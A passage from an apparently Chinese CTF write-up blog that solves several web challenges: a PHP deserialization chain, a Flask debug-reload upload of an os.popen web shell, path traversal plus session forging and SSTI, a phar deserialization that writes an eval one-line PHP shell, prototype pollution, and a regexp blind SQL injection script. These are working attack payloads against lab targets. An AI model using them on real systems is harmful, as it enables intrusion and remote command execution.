class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>至于为啥修改我也不是很清楚。。</p><h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p><img src="/img/flaskdisk1.png" alt="flaskdisk1"></p><p>三个路由：<code>list</code>，<code>upload</code>，<code>console</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/list<br>app.py 1746b 2023-10-14 11:16:00<br>/upload<br>上传文件<br>/console<br>输入PIN码<br></code></pre></td></tr></table></figure><p>一开始以为要去生成<code>PIN</code>码然后进控制台。。但捣鼓半天也没找到能读我需要的数据的地方。</p><p><code>upload</code>这个路由倒是没啥限制，但我上传完东西不知道上传路径是啥。</p><p>后面看了下<code>wp</code>(参考：<code>https://blog.csdn.net/m0_73512445/article/details/133694293</code>):</p><p>因为访问<code>console</code>这个路由会提示要输入<code>PIN</code>码(说明<code>flask</code>开启了<code>debug</code>模式。<code>flask</code>开启了<code>debug</code>模式下，<code>app.py</code>源文件被修改后会立刻加载。所以只需要上传一个能<code>rce</code>的<code>app.py</code>文件把原来的覆盖，就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> os<br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <br>    <span class="hljs-keyword">try</span>:        <br>        cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)        <br>        data = os.popen(cmd).read()        <br>        <span class="hljs-keyword">return</span> data    <br>    <span class="hljs-keyword">except</span>:        <br>        <span class="hljs-keyword">pass</span>    <br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    <br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>) <span class="hljs-comment">#题目提示了运行在5000端口</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/flaskdisk2.png" alt="flaskdisk2"></p><h2 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">//Dockerfile<br><span class="hljs-keyword">FROM</span> vulhub/flask:<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span><br><span class="hljs-keyword">ENV</span> FLAG=flag&#123;not_here&#125;<br><span class="hljs-keyword">COPY</span><span class="language-bash"> src/ /app</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /app/start.sh /start.sh &amp;&amp; <span class="hljs-built_in">chmod</span> 777 /start.sh</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [ <span class="hljs-string">&quot;/start.sh&quot;</span> ]</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p><img src="/img/injectme1.png" alt="injectme1"></p><p><code>/app</code>目录泄露，里面有原本在<code>src</code>目录中的文件。</p><p><img src="/img/injectme2.png" alt="injectme2"></p><p>注意<code>URL</code></p><p><img src="/img/injectme3.png" alt="injectme3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dwonload</span>():<br>filename = request.arg.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#从请求的参数中获取名为 &#x27;file&#x27; 的值，如果没有提供则默认为空字符串。</span><br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#../被替换成空，可以考虑..././绕过</span><br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename) <span class="hljs-comment">#将经过处理的文件名与 &#x27;static/img/&#x27; 目录拼接起来，生成最终的文件路径</span><br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<span class="hljs-comment">#检查文件是否存在，并且文件路径中不包含 &quot;start&quot; 字符串</span><br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br></code></pre></td></tr></table></figure><p>我们利用目录穿越去找<code>app,py</code>:</p><p><code>cancanneed?file=..././..././..././app/app.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br>app.secret_key = secret_key<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():  <span class="hljs-comment"># put application&#x27;s code here</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/cancanneed&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cancanneed</span>():<br>    all_filename = os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>)<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename)<br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/backdoor&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">&quot;user&quot;</span>))<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;user&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            session[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>        name = session.get(<span class="hljs-string">&quot;user&quot;</span>)<br>        <span class="hljs-keyword">if</span> re.findall(<br>                <span class="hljs-string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,<br>                name):<br>            abort(<span class="hljs-number">500</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template_string(<br>                <span class="hljs-string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)<br>    <span class="hljs-keyword">except</span> Exception:<br>        abort(<span class="hljs-number">500</span>)<br><br></code></pre></td></tr></table></figure><p>注意<code>/backdoor</code>则个路由，很明显这里存在<code>SSTI</code></p><p><code>from config import secret_key</code></p><p>目录穿越找<code>config.py</code>:</p><p><code>cancanneed?file=..././..././..././app/config.py</code></p><p><code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p><p>抓包看<code>SESSION</code>:</p><p><img src="/img/injectme4.png" alt="injectme4"></p><p><code>eyJ1c2VyIjoiZ3Vlc3QifQ.ZWMqqQ.pyASrkelEUhTYiw79-4TDZ-IzwM</code></p><p>之前在<code>Kali</code>下过，直接用了：</p><p><img src="/img/injectme5.png" alt="injectme5"></p><p>注入点就是这个<code>guest</code>了，但过滤了挺多东西。可以把<code>guest</code>换成<code>&#123;%print(7*7)%&#125;</code>看看：</p><p><code>&#123;&#39;user&#39;: &#39;&#123;%print(7*7)%&#125;&#39;&#125;</code></p><p><img src="/img/injectme6.png" alt="injectme6"></p><p><img src="/img/injectme7.png" alt="injectme7"></p><p>其实<code>+</code>这东西被过滤了无所谓的，<code>[&quot;__cla&quot;&quot;ss__&quot;]</code>能达到同样的效果</p><p><code>&#123;&#39;user&#39;: &#39;&#123;%print(7*7)%&#125;&#39;&#125;</code></p><p><code>&#123;%%20print([]["__cl""ass__")%20%&#125;</code></p><h2 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h2><p><img src="/img/phar1.png" alt="phar1"></p><p>源码中提示<code>class.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//注意这里的exec</span><br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br></code></pre></td></tr></table></figure><p><code>Phar反序列化</code>，参考：<code>https://mochu.blog.csdn.net/article/details/106909777</code></p><p>这东西个人理解主要就是<code>phar</code>压缩文件时，会序列化用户可控的<code>meta-data</code>的内容。然后和<code>phar://</code>协议配合把这个字段的内容反序列化，从而触发<code>__destruct()</code>等方法。</p><p>利用条件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>参考：https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/CoLo/</span>p/<span class="hljs-number">16786627</span>.html<br><span class="hljs-number">1</span>、phar文件能够上传至服务器 <br><span class="hljs-regexp">//</span>即要求存在file_get_contents()、fopen()这种函数<br><br><span class="hljs-number">2</span>、要有可利用的魔术方法<br><span class="hljs-regexp">//</span>这个的话用一位大师傅的话说就是利用魔术方法作为<span class="hljs-string">&quot;跳板&quot;</span><br><br><span class="hljs-number">3</span>、文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤<br><span class="hljs-regexp">//</span>一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是`Phar:<span class="hljs-regexp">//</span>`这种，如果这几个特殊字符被过滤就无法实现反序列化<br><br><span class="hljs-number">4</span>、php.ini中的phar.readonly选项，需要为Off（默认是on）。<br></code></pre></td></tr></table></figure><p>利用参考文章中的代码生成我们需要的<code>phar</code>文件：</p><p>要注意的就是<code>exec是没回显的，如果是eval我们直接可以写命令进去</code></p><p>看了官方的wp，学习了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//whatsphar.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd=<span class="hljs-string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>\</code>这东西是转义用的：</p><p><img src="/img/phar4.png" alt="phar4"></p><p>对于<code>$a-&gt;cmd=&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#39;a&#39;]);\&quot;&gt;/var/www/html/1.php&quot;;</code></p><p>利用<code>echo</code>输出<code>&lt;?=@eval(\\\$_POST[&#39;a&#39;]);?&gt;</code>这个字符串，然后把它重定向到<code>/var/www/html/1.php</code>中。简单说就是把一句话木马写到对应文件里。</p><p>可以看下<code>AI</code>解释：</p><p><img src="/img/phar5.png" alt="phar5"></p><p>再补充一下关于连续三个转义符号的解释。。直接贴我和<code>x1r0z</code></p><p><img src="/img/phar9.png" alt="phar9"></p><p><img src="/img/phar10.png" alt="phar10"></p><p><img src="/img/phar11.png" alt="phar11"></p><p>如果题目给的是<code>eval</code>就没这么麻烦了。。</p><p>可以自己起个环境，访问<code>/whatphar.php</code>，在根目录刷新一下就能出现我们需要的<code>hacker.phar</code>文件了。</p><p>对于<code>phar://</code>协议来说文件名不重要，只要内容格式是phar即可触发反序列化：</p><p><img src="/img/phar3.png" alt="phar3"></p><p>。。触发了过滤，检查了文件内容并且不允许出现<code>__HALT_COMPILER();?&gt;</code>。</p><p>不过对于<code>Phar</code>文件结构来说，<code>a sub</code>中要求<code>phar</code>文件必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则无法被<code>phar扩展</code>识别为<code>phar</code>文件。</p><p>搜了下<code>phar文件过滤__HALT_COMPILER();?&gt;</code>：<code>https://cloud.tencent.com/developer/article/2278965</code></p><p>可以利用<code>gizp</code>将生成的Phar文件进行压缩：</p><p><img src="/img/phar8.png" alt="phar8"></p><p>然后将生成的<code>hello.jpg</code>直接上传，会给个上传路径：</p><p><img src="/img/phar6.png" alt="phar6"></p><p>进<code>class.php</code>，利用<code>phar</code>协议反序列化：</p><p><code>file=phar://upload/f19fac1b1e7aa6a2df2d5cb5eada2d10.jpg</code></p><p>然后访问<code>1.php</code>，<code>POST</code>给<code>a</code>传参执行命令就行了。</p><p><img src="/img/phar7.png" alt="phar7"></p><h2 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h2><p>这题不会。。跟着官方<code>wp</code>做的</p><p>下载附件后先看<code>hint</code>:</p><p><img src="/img/otenboy1.png" alt="otenboy1"></p><p>进入<code>routes</code>下(注意<code>merge</code>函数)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//info.js</span><br><span class="hljs-keyword">const</span> &#123; mergeJSON, createDate &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./_components/utils&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-title function_">mergeJSON</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>), <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>), <span class="hljs-literal">true</span>);<br><span class="hljs-comment">//submit.js</span><br><span class="hljs-keyword">const</span> &#123; rndID, mergeJSON &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./_components/utils&quot;</span>);<br><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">mergeJSON</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br></code></pre></td></tr></table></figure><p>利用<code>require</code>引入了一个名为<code>mergeJSON</code>的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//utils.js</span><br><span class="hljs-keyword">const</span> mergeJSON = <span class="hljs-keyword">function</span> (<span class="hljs-params">target, patch, deep = <span class="hljs-literal">false</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> patch !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> patch;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(patch)) <span class="hljs-keyword">return</span> patch; <span class="hljs-comment">// do not recurse into arrays</span><br>    <span class="hljs-keyword">if</span> (!target) target = &#123;&#125;<br>    <span class="hljs-keyword">if</span> (deep) &#123; target = <span class="hljs-title function_">copyJSON</span>(target), patch = <span class="hljs-title function_">copyJSON</span>(patch); &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> patch) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&quot;__proto__&quot;</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">//这里过滤了`__proto__，可以用constructor.prototype代替`</span><br>        <span class="hljs-keyword">if</span> (target[key] !== patch[key])<br>            target[key] = <span class="hljs-title function_">mergeJSON</span>(target[key], patch[key]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> target;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_6</title>
    <link href="/2023/11/29/-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_6/"/>
    <url>/2023/11/29/-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_6/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/img/nctf2015sqli1.png" alt="nctf2015sqli1"></p><p><img src="/img/nctf2019sqli2.png" alt="nctf2019sqli2"></p><p><code>robots.txt</code>下提示<code>hint.txt</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><br>If <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] === admin<span class="hljs-string">&#x27;s password,</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then you will get the flag;</span><br></code></pre></td></tr></table></figure><p>查询语句：</p><p><code>sqlquery : select * from users where username=&#39;&#39; and passwd=&#39;&#39;</code></p><p>一开始想用<code>\</code>去转义<code>username</code>的单引号然后用万能密码登录：</p><p><code>\</code>和<code>||1</code>，查询语句会变成：</p><p><code>select * from users where username=&#39;\&#39; and passwd=&#39;||1&#39;</code>,此时用户名就是<code>&#39; and passwd=</code>，后面连一个<code>||1</code>。但不知道后面那个单引号要怎么闭合(注释符被屏蔽掉了)</p><p>看了wp发现还可以用<code>;</code>和<code>%00</code>拼接实现截断：</p><blockquote><p>php &lt; 5.3.4, 且 magic_quotes_gpc &#x3D; Off 时可进行 <code>%00</code> 截断</p></blockquote><p>这里我理解的就是利用<code>;</code>终止了<code>passwd</code>部分的输入，然后再用<code>%00</code>截断后面的单引号</p><p><code>username=123%5C&amp;passwd=||1;%00</code>:</p><p><img src="/img/nctfsqli1.png" alt="nctfsqli1"></p><p>重定向到了<code>welcome.php</code>，但实际这东西没法访问。。</p><p><img src="/img/nctfsqli20193.png" alt="nctfsqli20193"></p><p><code>regexp</code>注入：<code>正则注入</code>(参考：<code>https://blog.csdn.net/l2872253606/article/details/125265138</code>)</p><p>比如匹配<code>e</code>开头的：</p><p><img src="/img/nctf2019sqli4.png" alt="nctf2019sqli4"></p><p>再看看<code>a</code>开头的：</p><p><img src="/img/nctf2019sqli5.png" alt="nctf2019sqli5"></p><p>所以我们可以这么判断：</p><p><code>username=123%5C&amp;passwd=||/**/passwd/**/regexp/**/&quot;^y&quot;;%00</code></p><p><img src="/img/nctf2019sqli6.png" alt="nctf2019sqli6"></p><p><code>username=123%5C&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code></p><p><img src="/img/nctf2019sqli7.png" alt="nctf2019sqli7"></p><p>注意两个页面的不同，其实这么搞就有点像盲注了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br>url = <span class="hljs-string">&quot;http://662edc83-8269-4f75-93e8-01b69e9c73a2.node4.buuoj.cn:81/&quot;</span><br>pw_fuzz = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;_&quot;</span>  <span class="hljs-comment"># 密码字典：小写字母和数字还有下划线</span><br>pw = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># admin的密码</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pw_fuzz:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;\\&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>((pw+i),parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))<br>        &#125;<br>        res = requests.post(url=url, data=data).text<br>        <span class="hljs-comment">#print(res)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;welcome.php&quot;</span>  <span 